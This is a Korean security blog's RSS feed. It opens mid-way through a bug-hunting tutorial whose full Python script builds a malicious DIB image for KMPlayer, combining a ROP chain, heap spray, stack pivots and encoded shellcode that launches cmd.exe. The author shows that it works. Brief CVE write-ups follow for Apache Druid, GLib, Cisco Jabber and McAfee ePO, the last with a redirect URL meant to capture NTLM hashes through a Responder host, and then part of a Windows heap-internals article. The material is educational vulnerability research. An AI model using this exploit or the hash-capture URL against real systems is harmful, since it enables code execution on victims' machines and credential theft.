class="hljs-number">0x00652cb0</span>, <span class="hljs-comment"># POP EBP # RETN [KMPlayer.exe]</span><span class="hljs-number">0x0042390c</span>, <span class="hljs-comment"># &amp; jmp esp [KMPlayer.exe]</span><span class="hljs-number">0x004c0267</span>, <span class="hljs-comment"># POP EBX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000201</span>, <span class="hljs-comment"># 0x00000201-&gt; ebx</span><span class="hljs-number">0x0052d95d</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000040</span>, <span class="hljs-comment"># 0x00000040-&gt; edx</span><span class="hljs-number">0x0082f8e0</span>, <span class="hljs-comment"># POP ECX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d0aafc</span>, <span class="hljs-comment"># &amp;Writable location [KMPlayer.exe]</span><span class="hljs-number">0x009fc414</span>, <span class="hljs-comment"># POP EDI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00426485</span>, <span class="hljs-comment"># RETN (ROP NOP) [KMPlayer.exe]</span><span class="hljs-number">0x0068c402</span>, <span class="hljs-comment"># POP EAX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x90909090</span>, <span class="hljs-comment"># nop</span><span class="hljs-number">0x00744e56</span>, <span class="hljs-comment"># PUSHAD # RETN [KMPlayer.exe]</span>]<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)<span class="hljs-comment">#shellcode for runnig cmd.exe</span>shellcode = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">0x100</span>shellcode += <span class="hljs-string">&quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&quot;</span>shellcode += <span class="hljs-string">&quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&quot;</span>shellcode += <span class="hljs-string">&quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&quot;</span>shellcode += <span class="hljs-string">&quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&quot;</span>shellcode += <span class="hljs-string">&quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&quot;</span>shellcode += <span class="hljs-string">&quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&quot;</span>shellcode += <span class="hljs-string">&quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&quot;</span>shellcode += <span class="hljs-string">&quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&quot;</span>shellcode += <span class="hljs-string">&quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&quot;</span>shellcode += <span class="hljs-string">&quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&quot;</span>shellcode += <span class="hljs-string">&quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&quot;</span>shellcode += <span class="hljs-string">&quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&quot;</span>shellcode += <span class="hljs-string">&quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&quot;</span>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)up = <span class="hljs-keyword">lambda</span> x : unpack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)[<span class="hljs-number">0</span>]rop_chain = create_rop_chain()BITMAPFILEHEADER = OrderedDict()BITMAPINFOHEADER = OrderedDict()BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSize&#x27;</span>] = <span class="hljs-string">&#x27;\x28\x1f\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x28</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&#x27;biPlanes&#x27;</span>] = <span class="hljs-string">&#x27;\x01\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biBitCount&#x27;</span>] = <span class="hljs-string">&#x27;\x18\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biCompression&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x0a\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>]) *up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>])))BITMAPINFOHEADER[<span class="hljs-string">&#x27;biXPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biYPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrUsed&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x02\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrImportant&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfType&#x27;</span>] = <span class="hljs-string">&#x27;BM&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfsize&#x27;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) + <span class="hljs-number">0x36</span>)BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved1&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved2&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfOffBits&#x27;</span>] = <span class="hljs-string">&#x27;\x36\x00\x00\x00&#x27;</span>head = <span class="hljs-string">&#x27;Fandu_&#x27;</span>tail = <span class="hljs-string">&#x27;FANDU_&#x27;</span>spray = <span class="hljs-string">&#x27;\x11&#x27;</span>stack_to_heap = p(<span class="hljs-number">0x00523702</span>) <span class="hljs-comment"># PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</span>heap_to_heap = p(<span class="hljs-number">0x0095ddef</span>) <span class="hljs-comment"># ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN</span>pivot = p(<span class="hljs-number">0x00433712</span>) <span class="hljs-comment"># POP EDX # POP EDI # POP ESI # POP EBX # RETN</span>ret = p(<span class="hljs-number">0x00984e94</span>) <span class="hljs-comment"># RETN</span>offset1 = <span class="hljs-number">0x11111111</span> - <span class="hljs-number">0x101cb056</span> - <span class="hljs-number">0x600000</span> <span class="hljs-comment"># for calculating size of 0x11 spray</span>offset2 = <span class="hljs-number">0x197c0d11</span> - <span class="hljs-number">0x173772e1</span> - <span class="hljs-number">0x100000</span> <span class="hljs-comment"># for skip some data which are mutated</span>payload = <span class="hljs-string">&#x27;&#x27;</span>payload += head +<span class="hljs-string">&#x27;aa&#x27;</span>payload += spray * offset1payload += (heap_to_heap + stack_to_heap) * (<span class="hljs-number">0x400000</span> * <span class="hljs-number">2</span> / <span class="hljs-number">8</span>)payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)payload += ret * (<span class="hljs-number">0x20000</span> / <span class="hljs-number">4</span>)payload += rop_chainpayload += shellcodepayload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>payload += tailexploit = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPFILEHEADER.keys() :exploit += BITMAPFILEHEADER[key]<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPINFOHEADER.keys() :exploit += BITMAPINFOHEADER[key]exploit += payloadf = open(<span class="hljs-string">&#x27;./exploit.dib&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)f.write(exploit)f.close()</code></pre><p>그리고 이 파이썬 스크립트를 실행시켜 떨궈진 <code>exploit.dib</code> 파일을 KMPlayer에 넣어 실행하면!!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png" alt="bughunting-tutorials-part4/image--076.png"></p><p>이렇게 <code>cmd.exe</code>가 실행됩니다!!! 짝짝짝 ㅎㅎㅎㅎㅎㅎ</p><h1 id="그의-과거의-마지막-잡담"><a href="#그의-과거의-마지막-잡담" class="headerlink" title="그의 (과거의) 마지막 잡담"></a>그의 (과거의) 마지막 잡담</h1><p>으으 드디어 끝났네요 ㅋㅋ 원래 12 월 중순인가 말인가 시작했는 데 1 월에 멘탈이 나가 있어 가지고 이제야 끝났네요 후우… 역시 나 새끼는 게으른 놈….</p><p>원래 이 글을 쓴 이유가 동아리 후배들 교육시키기 위한 것도 있지만 사실 전에 cdpython 형이 이 취약점으로 버그헌팅 글 쓰면 좋을 거 같다고 해서 쓰게 됐습니다 ㅋㅋ 많은 분들에게 도움이 되었으면 좋겠네요. 사실 요즘 너무 잘하는 사람이 많아서 이런 거 보는 사람이 있겠냐만은… 잘하는 사람은 이거 보지도 않겠지… 쥬륵 나도 이제 잘해야지…. ㅋㅋㅋ 근데 일단 졸업부터 하즈아아아아 ㅠㅠㅠㅠ</p><p>그래도 제가 이 정도라도 할 수 있게 채찍질 해준 passket, combabo, cdpython, morinori89 형들 감사합니닼ㅋㅋㅋㅋㅋㅋㅋ 후우…. 사실 형들이랑 제일 많이 한 거는 해킹보다는 술 처먹는 거 같지만…. 그리고 문서 피드백 준 SSG 후배들 Frozenbeer 땡큐땡큐 ㅋㅋㅋ</p><p>그럼 다들 즐햌!!!</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bug-hunting/">bug hunting</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/31/l0ch/bughunting-tutorials-part4/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-25646: Apache Druid 원격 코드 실행 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/31/fabu1ous/2021-03-31/</link>
+      <guid>https://hackyboiz.github.io/2021/03/31/fabu1ous/2021-03-31/</guid>
+      <pubDate>Wed, 31 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/25/cve-2021-25646-getting-code-execution-on-apache-druid">CVE-2021-25646 : Getting Code Execution on Apache Druid</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Apache Druid &lt;= 0.20.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache Druid는 Request를 통해 사용자 제공 JavaScript코드를 실행하는 기능이  있습니다. 이 기능은 신뢰도가 높은 환경에서 사용하기 위한 것이므로 기본적으로 비활성화되어 있습니다. 그러나 Druid 0.20.0 이전 버전에서는 서버 구성에 관계없이 사용자가 제공한 JavaScript 코드를 실행할 수 있는 취약점(CVE-2021-25646)이 발견되었습니다. 해커는 해당 취약점을 악용해 Druid 서버 프로세스의 권한으로 타겟 시스템에서 원격 코드실행을 할 수 있습니다. </p><p>CVE-2021-25646은 Apache Druid의 Jackson이 JavaScript 타입의 JSON 데이터 구문을 파싱하는 과정에서 발생합니다. </p><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">JavaScriptDimFilter</span><span class="hljs-params">(<span class="hljs-meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension, <span class="hljs-meta">@JsonProperty(&quot;function&quot;)</span> </span></span><span class="hljs-function"><span class="hljs-params">            String function, <span class="hljs-meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="hljs-meta">@Nullable</span> ExtractionFn extractionFn, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="hljs-meta">@Nullable</span> FilterTuning filterTuning, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JacksonInject</span> JavaScriptConfig config)</span> </span><span class="hljs-function"></span>&#123;   Preconditions.checkArgument(dimension != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;dimension must not be null&quot;</span>);   Preconditions.checkArgument(function != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;function must not be null&quot;</span>);   <span class="hljs-keyword">this</span>.dimension = dimension;   <span class="hljs-keyword">this</span>.function = function;   <span class="hljs-keyword">this</span>.extractionFn = extractionFn;   <span class="hljs-keyword">this</span>.filterTuning = filterTuning;   <span class="hljs-keyword">this</span>.config = config; &#125;</code></pre><p>JSON 데이터의  <code>name</code>속성이  “”일 때 빈 키값을 JavaScriptDimFilter 클래스의  <code>config</code>파라미터에 바인딩 시킬 수 있습니다. 따라서 해커는 JavaScript 실행 설정을 활성화하여 <code>function</code> 키값으로 제공한 JavaScript 코드를 실핼할 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/apache/">apache</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/31/fabu1ous/2021-03-31/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-27219: GLib의 integer overflow 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/30/l0ch/2021-03-30/</link>
+      <guid>https://hackyboiz.github.io/2021/03/30/l0ch/2021-03-30/</guid>
+      <pubDate>Tue, 30 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-045-g</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-045-g_bytes_new/">GHSL-2021-045: Integer Overflow in GLib - CVE-2021-27219</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>테스트된 버전</p><ul><li>Ubuntu 20.04 (x86_64) : 버전 2.64.6-1</li><li>CentOS Stream (x86_64) : 버전 2.56.4-9</li><li>archlinux (x86_64) : 2.66.4-2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>64비트 플랫폼의 glib에서 암시적 형 변환으로 인한 integer overflow 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 데이터로부터 <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#GBytes">GBytes</a> 객체를 생성하는 <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#g-bytes-new">g_bytes_new()</a> 함수에 존재합니다.</p><pre><code class="hljs jsx">GBytes * g_bytes_new (gconstpointer data, gsize size)&#123;  g_return_val_if_fail (data != NULL || size == <span class="hljs-number">0</span>, NULL);<span class="hljs-comment">//integer overflow</span>  <span class="hljs-keyword">return</span> g_bytes_new_take(g_memdup (data, size), size);  &#125;</code></pre><p>64bit 자료형인 <code>gsize</code> 형 <code>size</code>를 <code>g_memdup</code> 함수의 두 번째 인자로 사용합니다.</p><pre><code class="hljs c"><span class="hljs-comment">//g_memdup 함수 원형</span>g_memdup(gconstpointer mem, guint byte_size);</code></pre><p>그러나 <code>g_memdup</code>은 해당 인자를 32bit 자료형 <code>guint</code>으로 받아 암시적 형 변환이 이루어집니다. 이로 인해 훨씬 작은 데이터 버퍼를 포함하는 GBytes 객체를 반환하고 이는 memory corruption 취약점으로 이어질 수 있습니다.</p><p>해당 취약점의 패치 히스토리는 <a href="https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits">https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits</a> 에서 확인 가능합니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/30/l0ch/2021-03-30/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Cisco Jabber에서 발견된 5가지 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/29/idioth/2021-03-29/</link>
+      <guid>https://hackyboiz.github.io/2021/03/29/idioth/2021-03-29/</guid>
+      <pubDate>Mon, 29 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://tools.cisco.com/security/center/content/CiscoSecu</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-jabber-PWrTATTC">Cisco Jabber Desktop and Mobile Client Software Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Jabber for Windows, MacOS, mobile Platforms</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>언제 어디서나 기기를 이용하여 직원의 상태 정보 확인 및 채팅, 음성 통화, 회의 등을 제공하는 UC 클라이언트인 Cisco Jabber에서 권한 상승 및 임의 프로그램 실행, 정보 유출(Information Disclosure), 네트워크 패킷 intercept, DoS 공격 등 여러 가지 취약점이 발견되었습니다.</p><p>각 취약점은 서로 연관성이 없으며 하나의 취약점에 영향을 받는 버전이라도 다른 취약점엔 영향을 받지 않을 수 있습니다. Certificate Validation을 제외한 취약점들은 Cisco Jabber의 잘못된 메시지 content 검증으로 인해 발생합니다. 이를 통해 해커는 조작된 <a href="https://ko.wikipedia.org/wiki/XMPP">XMPP</a> 메시지를 타깃 시스템에 전송하여 클라이언트를 실행 중인 사용자 권한으로 임의 프로그램 실행을 하거나, 프로그램의 인증 정보를 받아 오거나 서비스 거부 공격(Denial of Service)이 가능합니다.</p><p>또한 자격 증명에 대한 잘못된 유효성 검사로 인하여 네트워크 request를 가로채 조작된 인증서를 통해 클라이언트와 서버 간의 연결을 확인하거나 수정할 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/cisco/">cisco</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/29/idioth/2021-03-29/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-23888: McAfee ePolicy Orchestrator HTML Injection</title>
+      <link>https://hackyboiz.github.io/2021/03/28/insu/2021-03-28/</link>
+      <guid>https://hackyboiz.github.io/2021/03/28/insu/2021-03-28/</guid>
+      <pubDate>Sun, 28 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ricardojba.github.io/CVE-2021-23888-McAfee-ePolic</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ricardojba.github.io/CVE-2021-23888-McAfee-ePolicy-Orchestrator-HTML-Injection/">CVE-2021-23888 - McAfee ePolicy Orchestrator HTML Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee ePolicy Orchestrator</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee ePolicy Orchestrator 5.10 Update 10 이전 버전에서 검증되지 않은 client 측 URL redirect 취약점이 발견되었습니다. 이 취약점을 통해 인증된 ePO 사용자는 신뢰되지 않은 ePO IFRAME을 로드하여 인증된 사용자의 정보를 도용할 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#/core/orionDefaultPage.do</span></code></pre><p>위의 주소로 접근을 하게 되면 <code>/core/orionDefaultPage.do</code>가 IFRAME 내부에서 참조되는 것을 확인할 수 있습니다.</p><p>여러 시도를 통해 <a href="https://epo-host:8443/core/orionNavigationLogin.do#//google.com"><code>https://epo-host:8443/core/orionNavigationLogin.do#//google.com</code></a> google search page를 IFRAME에서 로드하는 것을 확인할 수 있습니다.</p><p>공격자는 <code>#</code> 뒤의 domain/URL을 바꾸어 victim에게 보내 피싱 공격을 할 수 있습니다.</p><p><img src="/2021/03/28/insu/2021-03-28/Untitled.png"></p><p>또한, host에서 실행되는 Responder-or-Inveigh를 가리키게 해 ePO 사용자의 NetNTM 해시를 얻을 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#//host-running-responder-or-inveigh</span></code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/insu/">insu</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/mcafee/">mcafee</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/html-injection/">html injection</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/28/insu/2021-03-28/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</title>
+      <link>https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/</link>
+      <guid>https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/</guid>
+      <pubDate>Sun, 28 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;이전-시리즈-바로가기&quot;&gt;&lt;a href=&quot;#이전-시리즈-바로가기&quot; class=&quot;headerlink&quot; title=&quot;이전 시리즈 바로가기&quot;&gt;&lt;/a&gt;이전 시리즈 바로가기&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p><hr><p>안녕하세요! 지난 폰쿨섹시 시리즈에 이어 오늘도 윈도우에 고통받고 있는 L0ch입니다! </p><p>시작하기 전에 근황 얘기를 조금 하자면 제 프로필 사진이 거지 같아졌습니다. 아니 비유가 아니라 말 그대로요… </p><p>어느 날 idioth 팀장형(이라 쓰고 독재자라고 읽는다)이 급하게 부르길래 무슨 일인가 했더니</p><blockquote><p>“야 너 지금 프로필 사진 별로다 내가 새로 그려줄까?”<br>“ㄴㄴ 나 지금 마음에 드는데”<br>“내가 마음에 안 들어 기다려봐ㅋ”<br>(10분 뒤)</p></blockquote><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled.png" alt="pwncoolsexy-part3/Untitled.png"></p><blockquote><p>“?”<br>“ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ 이걸로 함 팀장 권한으로 의견은 안 받음 ㅅㄱ”<br>“tq”</p></blockquote><p>팀장의 권력남용으로 제 의견은 단 1도 없이 프로필 사진을 변경당했어요. 마른하늘에 웬 날벼락이지 이게</p><p>알고 보니 저만 당한 게 아니었더라구요 ㅋ.ㅋ  이 형 우리 놀리려고 해킹하는 게 분명해..</p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%201.png" alt="pwncoolsexy-part3/Untitled%201.png"></p><blockquote><p>ㄹㅇ 똑같이 그려서 더 분하다</p></blockquote><p>이렇게 또 팀장 죽창 1스택을 쌓으며 쓴 이번 글에서는 Part 2에서 소개한 구조체를 NT Heap이 어떻게 써먹으면서 Heap 메모리를 할당하고 해제하는지 알아보겠습니다.. </p><h1 id="Allocate-in-NT-Heap"><a href="#Allocate-in-NT-Heap" class="headerlink" title="Allocate in NT Heap"></a>Allocate in NT Heap</h1><p>Heap 메모리 할당 요청이 들어오면 NT Heap의 메모리 할당 동작은 <code>RtlpAllocateHeap</code>에서 요청 크기에 따라 다음과 같이 세 가지로 나뉩니다.</p><ul><li>Size ≤ 0x4000</li><li>0x4000 &lt; Size ≤ 0xff000</li><li>Size &gt; 0xff000</li></ul><p><code>0xff000</code>은 <code>_Heap-&gt;VirtualMemoryThreshold &lt;&lt; 4</code> 의 값이며 가상 메모리 할당 기준값입니다. 또한 LFH는 크기가 <code>0x4000</code> 이하인 chunk만 관리한다고 이전 글에서 언급했었죠? 그래서 Non-LFH와 LFH의 할당 방식의 차이는 크기가 <code>0x4000</code>일 때만 고려하면 됩니다.</p><h2 id="Size-≤-0x4000"><a href="#Size-≤-0x4000" class="headerlink" title="Size ≤ 0x4000"></a>Size ≤ 0x4000</h2><p>요청 크기가 <code>0x4000</code>보다 작으면 먼저 LFH가 활성화되어 있는지 검사한 뒤 활성화 여부에 따라 할당 방법을 결정합니다.</p><h3 id="LFH-Disabled"><a href="#LFH-Disabled" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li>LFH가 비활성화되어 있으면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;FrontEndHeapUsageData</a>에 <code>0x21</code>을 더한 뒤, 해당 값이 <code>0xff00</code> 또는 <code>(&amp; 0x1f)</code>결과가 <code>0x10</code> 보다 큰지 검사합니다.<ul><li>조건을 만족하면 LFH를 활성화해 다음 chunk부터는 LFH로 할당됩니다.</li></ul></li><li>먼저 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>에 요청된 크기의 chunk가 있는지 확인하고 적절한 크기의 ListHint가 있으면 